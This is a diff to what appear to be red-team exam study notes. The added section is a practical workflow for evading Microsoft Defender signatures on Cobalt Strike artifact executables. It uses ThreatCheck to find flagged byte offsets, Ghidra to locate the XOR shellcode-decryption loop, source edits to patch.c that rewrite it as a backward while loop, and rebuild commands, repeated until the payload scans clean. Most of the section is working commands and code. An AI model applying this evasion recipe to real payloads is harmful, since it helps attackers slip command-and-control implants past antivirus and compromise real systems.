@@ -179,7 +179,79 @@ file(0x9CF)
 9. Replace the identified function loop or piece of code with alternative approach to bypass defender detection. Example a backwards while loop.  
 
 >Now repeat above by start with building new set of artifacts templates, and running ***ThreatCheck*** again.    
->Repeat until ***ThreatCheck*** shows no threat found.  
+>Repeat until ***ThreatCheck*** shows no threat found.
+
+### ThreatCheck → Ghidra — Practical Iteration Workflow
+
+**Full cycle (exam-day steps):**
+
+**1. ThreatCheck — get the flagged offset:**
+```cmd
+ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
+# Output: Byte[]: 0x00004C20
+#         HEX: 31 C0 48 FF C8 ...   ← these are the exact bytes Defender matched
+```
+No output = clean. Any output = signature found at that hex offset.
+
+**2. Ghidra — navigate to offset:**
+```
+Window → Go To
+Enter: 0x4C20    ← use the hex offset from ThreatCheck (must prefix with 0x)
+```
+The disassembly view jumps to the flagged bytes. The decompiler panel (right) shows the C-equivalent code.
+
+**3. Identify the flagged loop construct:**
+Look for a `for`-loop in the decompiler view. This is the XOR decryption loop in `patch.c`:
+```c
+// Signatured — Defender has this bytecode pattern flagged:
+for ( int x = 0; x < length; x++ ) {
+    buffer[x] = buffer[x] ^ key[x % 8];
+}
+```
+There are two instances in `patch.c`:
+- **Line ~45** — service executable (`.svc.exe`) payload loop
+- **Line ~116** — standard executable payload loop
+
+**4. Map to source and change loop direction in VSCode:**
+```
+VSCode: File > Open Folder → C:\Tools\cobaltstrike\arsenal-kit\kits\artifact
+Open: src-common\patch.c
+```
+
+**Line ~45 replacement:**
+```c
+// NEW — backward while-loop (compiles to different bytecode):
+int x = length;
+while ( x-- ) {
+    *( (char *)buffer + x ) = *( (char *)buffer + x ) ^ key[ x % 8 ];
+}
+```
+
+**Line ~116 replacement:**
+```c
+int x = length;
+while ( x-- ) {
+    *( (char *)ptr + x ) = *( (char *)buffer + x ) ^ key[ x % 8 ];
+}
+```
+> Comment out the old `for`-loop lines rather than deleting — easy rollback if the build breaks.
+
+**5. Rebuild:**
+```bash
+cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
+./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
+```
+
+**6. ThreatCheck again:**
+```cmd
+ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
+```
+- No output → **CLEAN** — load `artifact.cna` and move on.
+- New offset output → Defender found a *different* signature → repeat from Step 2 with the new offset.
+
+**Typical iteration count:** 2–3 cycles. Each cycle removes one Defender signature.
+
+**What the backward while-loop does:** The same XOR operation executes, but the compiler emits different opcodes for a backward-counting `while(x--)` vs a forward `for(x=0; x<n; x++)`. Defender's signature matches the specific opcode sequence from the forward loop — the backward loop breaks that match without changing the decrypt result.  
 
 ## Script Artifacts Kit  
 
